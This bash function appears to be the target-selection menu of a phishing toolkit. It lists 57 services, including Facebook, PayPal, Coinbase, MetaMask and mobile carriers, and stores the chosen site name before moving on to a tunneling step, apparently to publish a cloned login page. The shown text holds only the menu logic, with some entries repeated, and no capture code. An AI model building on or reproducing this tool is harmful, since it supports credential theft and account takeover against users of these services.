showmenu() {
    banner
    printf "${green}  [01]${white} facebook          [02]${white} instagram         [03]${white} google\n"
    printf "${green}  [04]${white} microsoft         [05]${white} netflix           [06]${white} paypal\n"
    printf "${green}  [07]${white} github            [08]${white} twitter           [09]${white} linkedin\n"
    printf "${green}  [10]${white} wordpress         [11]${white} snapchat          [12]${white} tiktok\n"
    printf "${green}  [13]${white} spotify           [14]${white} twitch            [15]${white} adobe\n"
    printf "${green}  [16]${white} discord           [17]${white} steam             [18]${white} epicgames\n"
    printf "${green}  [19]${white} origin            [20]${white} dropbox           [21]${white} onedrive\n"
    printf "${green}  [22]${white} protonmail        [23]${white} yahoo             [24]${white} outlook\n"
    printf "${green}  [25]${white} roblox            [26]${white} mediafire         [27]${white} pinterest\n"
    printf "${green}  [28]${white} ebay              [29]${white} adobeid           [30]${white} badoo\n"
    printf "${green}  [31]${white} deviantart        [32]${white} messenger         [33]${white} myspace\n"
    printf "${green}  [34]${white} reddit            [35]${white} vk                [36]${white} whatsapp\n"
    printf "${green}  [37]${white} telegram          [38]${white} snapchat          [39]${white} netflix\n"
    printf "${green}  [40]${white} hulu              [41]${white} amazon            [42]${white} ebay\n"
    printf "${green}  [43]${white} alibaba           [44]${white} paypal            [45]${white} stripe\n"
    printf "${green}  [46]${white} coinbase          [47]${white} binance           [48]${white} kucoin\n"
    printf "${green}  [49]${white} cryptocom         [50]${white} trustwallet       [51]${white} metamask\n"
    printf "${green}  [52]${white} opensea           [53]${white} rarlab            [54]${white} verizon\n"
    printf "${green}  [55]${white} att               [56]${white} tmobile           [57]${white} sprint\n"
    printf "${green}  [99]${white} back\n"
    printf "${green}  [00]${white} exit\n"
    printf "\n${blue}┌─[${white}select site${blue}]──[${white}~${blue}]\n${blue}└──╼ ${white}"
    read -r sitechoice
    case $sitechoice in
        1) site="facebook";; 2) site="instagram";; 3) site="google";;
        4) site="microsoft";; 5) site="netflix";; 6) site="paypal";;
        7) site="github";; 8) site="twitter";; 9) site="linkedin";;
        10) site="wordpress";; 11) site="snapchat";; 12) site="tiktok";;
        13) site="spotify";; 14) site="twitch";; 15) site="adobe";;
        16) site="discord";; 17) site="steam";; 18) site="epicgames";;
        19) site="origin";; 20) site="dropbox";; 21) site="onedrive";;
        22) site="protonmail";; 23) site="yahoo";; 24) site="outlook";;
        25) site="roblox";; 26) site="mediafire";; 27) site="pinterest";;
        28) site="ebay";; 29) site="adobeid";; 30) site="badoo";;
        31) site="deviantart";; 32) site="messenger";; 33) site="myspace";;
        34) site="reddit";; 35) site="vk";; 36) site="whatsapp";;
        37) site="telegram";; 38) site="snapchat";; 39) site="netflix";;
        40) site="hulu";; 41) site="amazon";; 42) site="ebay";;
        43) site="alibaba";; 44) site="paypal";; 45) site="stripe";;
        46) site="coinbase";; 47) site="binance";; 48) site="kucoin";;
        49) site="cryptocom";; 50) site="trustwallet";; 51) site="metamask";;
        52) site="opensea";; 53) site="rarlab";; 54) site="verizon";;
        55) site="att";; 56) site="tmobile";; 57) site="sprint";;
        99) mainmenu;; 00) killpid;;
        *) showmenu;;
    esac
    tunnelmenu
}
